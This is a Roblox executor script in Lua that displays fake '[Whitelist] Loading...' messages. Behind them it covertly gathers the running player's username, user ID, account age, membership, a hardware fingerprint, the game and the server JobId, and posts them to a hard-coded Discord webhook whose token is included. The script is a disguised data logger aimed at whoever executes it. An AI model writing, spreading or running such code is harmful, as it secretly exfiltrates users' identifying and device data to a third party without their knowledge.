local Http_Request = request;
local Body = Http_Request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local Decoded = game:GetService('HttpService'):JSONDecode(Body)
local Players = game:GetService("Players");
local LocalPlayer = Players.LocalPlayer;
local DName = LocalPlayer.DisplayName;
local Name = LocalPlayer.Name;
local Userid = LocalPlayer.UserId;
local GetHwid = Decoded.headers["Sw-Fingerprint"];
local AccountAge = LocalPlayer.AccountAge;
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21);
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or (secure_load and "Sentinel") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "Script-Ware") or ("Unsupported")
local Time = os.clock()
print("[Whitelist] Loading...")
wait(0.2)
print("[Whitelist] ".. identifyexecutor())
wait(0.2)
print("[Whitelist] Took: " .. math.round(os.clock() - Time) .. "s")
local url = "https://discord.com/api/webhooks/1057335544092303360/EsAjv4tdlwGFF_3p36CgFclWkZSb4YXC6D79wwO_BHGkS7H-4SH-53k7PSseXqxNagfE"
local data = {
   ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
   ["content"] = "",
   ["embeds"] = {
       {
    
      ["author"] = {
      ["name"] = "( Someone Executed The Script )",
      ["url"] = "https://roblox.com",
    },

           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
           ["type"] = "rich",
           ["color"] = tonumber(0xf2ff00),
           ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
            }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
wait(1)